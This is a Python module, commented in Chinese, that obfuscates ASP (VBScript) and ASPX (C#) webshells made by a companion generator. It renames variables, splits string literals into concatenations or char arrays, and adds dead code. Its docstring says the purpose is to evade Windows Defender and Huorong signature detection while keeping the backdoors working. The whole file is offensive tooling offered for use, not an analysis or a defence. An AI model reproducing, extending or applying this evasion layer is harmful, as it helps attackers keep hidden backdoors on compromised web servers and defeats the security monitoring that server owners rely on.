"""ASP/ASPX WebShell 静态混淆层

对 webshell_generator.py 生成的 ASP(VBScript) 和 ASPX(C#) 代码做轻量级混淆，
降低被 Windows Defender / 火绒等按字符串签名查杀的概率，同时保持功能不变。
"""

import random
import re
import string
import typing as t


def _rand_name(length: int = 0) -> str:
    if length <= 0:
        length = random.randint(6, 12)
    first = random.choice(string.ascii_letters)
    rest = "".join(random.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


def _quote_intervals(code: str, *quote_chars: str) -> t.List[t.Tuple[int, int]]:
    """返回代码中字符串/字符字面量的 [start, end) 区间列表"""
    intervals: t.List[t.Tuple[int, int]] = []
    i = 0
    while i < len(code):
        c = code[i]
        if c in quote_chars:
            j = i + 1
            while j < len(code):
                if code[j] == "\\" and j + 1 < len(code):
                    j += 2
                elif code[j] == c:
                    break
                else:
                    j += 1
            intervals.append((i, j + 1))
            i = j + 1
        else:
            i += 1
    return intervals


def _rename_in_code(code: str, mapping: t.Dict[str, str], intervals: t.List[t.Tuple[int, int]]) -> str:
    """重命名标识符，跳过字符串/字符区间"""
    def repl(m: re.Match) -> str:
        pos = m.start()
        for start, end in intervals:
            if start <= pos < end:
                return m.group(0)
        return mapping.get(m.group(1), m.group(1))

    return re.sub(r"\b([A-Za-z_]\w*)\b", repl, code)


# ---------------------------------------------------------------------------
# VBScript (ASP) 混淆
# ---------------------------------------------------------------------------

_VB_KEYWORDS = {
    "And", "As", "ByRef", "ByVal", "Call", "Case", "Class", "Const", "Dim", "Do",
    "Each", "Else", "ElseIf", "End", "Eqv", "Erase", "Error", "Exit", "Explicit",
    "False", "For", "Function", "Get", "GoTo", "If", "Imp", "In", "Is", "Let",
    "Loop", "Me", "Mod", "New", "Next", "Not", "Nothing", "Null", "On", "Option",
    "Or", "Private", "Public", "ReDim", "Rem", "Resume", "Select", "Set", "Step",
    "Sub", "Then", "To", "True", "Until", "Wend", "While", "With", "Xor", "Preserve",
    # built-in / object model names we should not rename
    "Server", "Request", "Response", "Session", "Application", "Object",
    "CreateObject", "GetObject", "Execute", "ExecuteGlobal", "Eval",
    "Len", "Mid", "Left", "Right", "Chr", "Asc", "ChrW", "AscB", "MidB",
    "LCase", "UCase", "Trim", "LTrim", "RTrim", "IsEmpty", "IsNull", "IsArray",
    "IsObject", "CStr", "CInt", "CLng", "CBool", "CDate", "CSng", "CDbl", "CByte",
    "Join", "Split", "Replace", "InStr", "InStrRev", "StrComp", "String", "Space",
    "Date", "Time", "Now", "Randomize", "Rnd", "vbCr", "vbLf", "vbCrLf", "vbTab",
    "vbNullString", "vbBinaryCompare", "vbTextCompare",
}


def _vb_declared_names(code: str) -> t.Set[str]:
    """收集用户定义的变量/函数名（粗糙但够用）"""
    names: t.Set[str] = set()

    # Function / Sub 定义
    for m in re.finditer(r"^\s*(?:Function|Sub)\s+([A-Za-z_]\w*)", code, re.M):
        names.add(m.group(1))

    # Dim 声明：支持 Dim a, b(10), c
    for m in re.finditer(r"^\s*Dim\s+(.+)$", code, re.M):
        parts = m.group(1).split(",")
        for part in parts:
            part = part.strip()
            part = re.sub(r"\(.*\)$", "", part).strip()
            if part and part not in _VB_KEYWORDS:
                names.add(part)

    # Set x = ... 赋值（首次出现视为声明）
    for m in re.finditer(r"^\s*Set\s+([A-Za-z_]\w*)\s*=", code, re.M):
        names.add(m.group(1))

    # For i = ...
    for m in re.finditer(r"^\s*For\s+([A-Za-z_]\w*)\s*=", code, re.M):
        names.add(m.group(1))

    return names


def _vb_split_string_literal(s: str) -> str:
    """把 VBScript 字符串字面量拆成多段 & 连接"""
    # 暂不处理含转义引号 "" 的字符串，避免拆错
    if '""' in s:
        return s
    inner = s[1:-1]
    if len(inner) <= 1:
        return s
    chunks = []
    i = 0
    while i < len(inner):
        step = random.randint(1, max(1, len(inner) - i))
        chunks.append(inner[i : i + step])
        i += step
    return " & ".join(f'"{c}"' for c in chunks)


def _vb_random_dead_code(indent: str = "    ") -> str:
    """生成无害的 VBScript 死代码"""
    v = _rand_name()
    val = "".join(random.choices(string.ascii_letters, k=random.randint(4, 10)))
    return f'{indent}Dim {v}\n{indent}{v} = "{val}"\n'


def obfuscate_vbscript(code: str) -> str:
    declared = _vb_declared_names(code)
    mapping = {name: _rand_name() for name in declared if name not in _VB_KEYWORDS}

    # 1) 先重命名用户标识符，跳过字符串字面量
    intervals = _quote_intervals(code, '"')
    code = _rename_in_code(code, mapping, intervals)

    # 2) 拆分字符串字面量
    code = re.sub(r'"([^"]|"")*"', lambda m: _vb_split_string_literal(m.group(0)), code)

    # 3) 在 Function/Sub 开头随机插入死代码
    lines = code.splitlines()
    new_lines: t.List[str] = []
    for line in lines:
        new_lines.append(line)
        if re.match(r"^\s*(Function|Sub)\s+", line, re.I):
            if random.random() < 0.7:
                new_lines.append(_vb_random_dead_code())
    code = "\n".join(new_lines)

    # 4) 在第一个 <% 之后插入不产生输出的死代码（避免 ASP 把注释输出到响应）
    first_block = code.find("<%")
    if first_block != -1:
        dead = "\n".join(
            f"Dim {_rand_name()}\nSet {_rand_name()} = Nothing"
            for _ in range(random.randint(2, 4))
        )
        code = code[: first_block + 2] + "\n" + dead + "\n" + code[first_block + 2 :]

    return code


# ---------------------------------------------------------------------------
# C# (ASPX) 混淆
# ---------------------------------------------------------------------------

_CSHARP_KEYWORDS = {
    "abstract", "as", "base", "bool", "break", "byte", "case", "catch", "char",
    "checked", "class", "const", "continue", "decimal", "default", "delegate",
    "do", "double", "else", "enum", "event", "explicit", "extern", "false",
    "finally", "fixed", "float", "for", "foreach", "goto", "if", "implicit",
    "in", "int", "interface", "internal", "is", "lock", "long", "namespace",
    "new", "null", "object", "operator", "out", "override", "params", "private",
    "protected", "public", "readonly", "ref", "return", "sbyte", "sealed",
    "short", "sizeof", "stackalloc", "static", "string", "struct", "switch",
    "this", "throw", "true", "try", "typeof", "uint", "ulong", "unchecked",
    "unsafe", "ushort", "using", "virtual", "void", "volatile", "while",
    # common types / object model
    "System", "Console", "Math", "Convert", "Encoding", "Environment",
    "BitConverter", "MD5", "MD5CryptoServiceProvider", "RijndaelManaged",
    "AES", "RSA", "Assembly", "Type", "MethodInfo", "PropertyInfo", "FieldInfo",
    "BindingFlags", "ParameterModifier", "Page", "Request", "Response", "Session",
    "Server", "Application", "Context", "HttpContext", "HttpRequest", "HttpResponse",
    "HttpSessionState", "Page_Load", "sender", "EventArgs", "Exception",
    "Process", "ProcessStartInfo", "File", "Directory", "Path", "Stream", "MemoryStream",
    "FileStream", "StreamReader", "StreamWriter", "StringBuilder", "DateTime",
    "Array", "List", "Dictionary", "HashSet", "IEnumerable", "IEnumerator",
    "Nullable", "object", "dynamic", "var", "get", "set", "value",
}


def _csharp_declared_names(code: str) -> t.Set[str]:
    names: t.Set[str] = set()

    # 变量声明：type name [= ...];
    for m in re.finditer(
        r"\b(?:string|byte\[\]|int|bool|long|double|float|char|object|Object|var|Exception|Process|ProcessStartInfo|StringBuilder|DateTime|Stream|MemoryStream|FileStream|DirectoryInfo|FileInfo)\s+([A-Za-z_]\w*)\b",
        code,
    ):
        names.add(m.group(1))

    # foreach (type x in ...)
    for m in re.finditer(r"\bforeach\s*\([^)]+\b([A-Za-z_]\w*)\s+in\b", code):
        names.add(m.group(1))

    # for (int i = ...)
    for m in re.finditer(r"\bfor\s*\(\s*[A-Za-z_][\w<>,\[\]]*\s+([A-Za-z_]\w*)\s*=?", code):
        names.add(m.group(1))

    # catch (Exception ex)
    for m in re.finditer(r"\bcatch\s*\(\s*[A-Za-z_][\w<>,\[\]]*\s+([A-Za-z_]\w*)\s*\)", code):
        names.add(m.group(1))

    return names


def _csharp_string_to_chars(s: str) -> str:
    """把普通字符串字面量转成 new string(new char[]{...})"""
    inner = s[1:-1]
    if len(inner) <= 1:
        return s
    # 简单转义处理：把 \" 和 \\ 保留，其它转义先不做复杂映射
    chars = []
    i = 0
    while i < len(inner):
        c = inner[i]
        if c == "\\" and i + 1 < len(inner):
            chars.append(f"'\\{inner[i+1]}'")
            i += 2
        elif c == "'":
            chars.append("'\\''")
            i += 1
        else:
            chars.append(f"'{c}'")
            i += 1
    return f"new string(new char[]{{{','.join(chars)}}})"


def _csharp_split_concat(s: str) -> str:
    """把字符串拆成 String.Concat("a","b",...) 或 char[] 形式"""
    inner = s[1:-1]
    if len(inner) <= 2:
        return s
    # 含转义字符的用 char[] 更安全，避免 String.Concat 拆出错
    if "\\" in inner:
        return _csharp_string_to_chars(s)
    if random.random() < 0.5:
        return _csharp_string_to_chars(s)
    parts = []
    i = 0
    while i < len(inner):
        step = random.randint(1, max(1, len(inner) - i))
        parts.append(inner[i : i + step])
        i += step
    return "string.Concat(" + ",".join(f'"{p}"' for p in parts) + ")"


def _obfuscate_csharp_block(block: str, is_script_block: bool = False) -> str:
    """对一段 C# 代码做混淆；is_script_block 为 True 时可安全插入死代码"""
    declared = _csharp_declared_names(block)
    mapping = {name: _rand_name() for name in declared if name not in _CSHARP_KEYWORDS}

    # 1) 先重命名局部变量，跳过字符串/字符字面量
    intervals = _quote_intervals(block, '"', "'")
    block = _rename_in_code(block, mapping, intervals)

    # 2) 字符串拆分 / char[] 构造
    block = re.sub(
        r'"([^"\\]|\\.)*"',
        lambda m: _csharp_split_concat(m.group(0)),
        block,
    )

    # 3) script runat=server 块顶部插入死代码方法
    if is_script_block:
        dead = "\n".join(
            f"private string {_rand_name()}(string {_rand_name()}) {{ return {_rand_name()}.ToUpper(); }}"
            for _ in range(random.randint(1, 3))
        )
        block = re.sub(
            r'(<script\s+runat\s*=\s*"server"\s*>)',
            r"\1\n" + dead,
            block,
            count=1,
            flags=re.I,
        )

    return block


def obfuscate_csharp(code: str) -> str:
    """对 ASPX 页面做分块混淆：
    - <%@ ... %> 指令原样保留
    - <% ... %> 内联代码块做混淆
    - <script runat="server">...</script> 做混淆并插入死代码
    - 其它内容原样保留
    """
    result: t.List[str] = []
    pos = 0
    while pos < len(code):
        # 指令块 <%@ ... %>
        if code.startswith("<%@", pos):
            end = code.find("%>", pos)
            if end == -1:
                result.append(code[pos:])
                break
            end += 2
            result.append(code[pos:end])
            pos = end
            continue

        # script 服务端代码块
        m = re.match(r'(<script\s+runat\s*=\s*"server"\s*>)', code[pos:], re.I)
        if m:
            start_tag = m.group(1)
            start_idx = pos + m.end()
            end_tag = "</script>"
            end_idx = code.lower().find(end_tag, start_idx)
            if end_idx == -1:
                result.append(code[pos:])
                break
            inner = code[start_idx:end_idx]
            obf_inner = _obfuscate_csharp_block(inner, is_script_block=False)
            result.append(start_tag + "\n" + obf_inner + "\n" + code[end_idx : end_idx + len(end_tag)])
            pos = end_idx + len(end_tag)
            continue

        # 内联代码块 <% ... %>
        if code.startswith("<%", pos):
            end = code.find("%>", pos)
            if end == -1:
                result.append(code[pos:])
                break
            end += 2
            inner = code[pos + 2 : end - 2]
            obf_inner = _obfuscate_csharp_block(inner, is_script_block=False)
            result.append("<%" + obf_inner + "%>")
            pos = end
            continue

        # 普通 HTML/文本，找到下一个 <% 或 <script
        next_script = code.lower().find("<script", pos)
        next_inline = code.find("<%", pos)
        candidates = [x for x in (next_script, next_inline) if x != -1]
        next_block = min(candidates) if candidates else -1
        if next_block == -1:
            result.append(code[pos:])
            break
        result.append(code[pos:next_block])
        pos = next_block

    return "".join(result)
